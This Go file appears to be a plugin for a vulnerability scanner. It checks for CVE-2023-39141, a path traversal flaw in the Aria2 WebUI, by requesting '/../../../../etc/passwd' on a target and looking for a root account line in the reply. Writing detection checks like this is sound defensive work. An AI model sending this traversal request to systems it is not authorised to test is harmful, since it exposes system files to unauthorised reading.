package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("aria2_wabui_path_traversal", &aria2_wabui_path_traversal{})
}

type aria2_wabui_path_traversal struct{}

func (p *aria2_wabui_path_traversal) Info() PluginInfo {
	return PluginInfo{
		Name:     "aria2-webui路径遍历漏洞",
		VulnInfo: "Aria2 WebUI控制台存在目录遍历漏洞，未授权的攻击者可通过../目录遍历读取任意系统文件，导致系统敏感信息泄露。",
		VulnID:   "CVE-2023-39141",
		Level:    "7.5 HIGH",
		URL:      "",
		Version:  "",
		CWE:      "CWE-22	路径遍历",
	}
}

func (p *aria2_wabui_path_traversal) Check(netloc string) bool {
	req, err := http.NewRequest("GET", netloc+"/../../../../etc/passwd", nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "/root:/bin/bash") {
		return true
	}
	return false
}
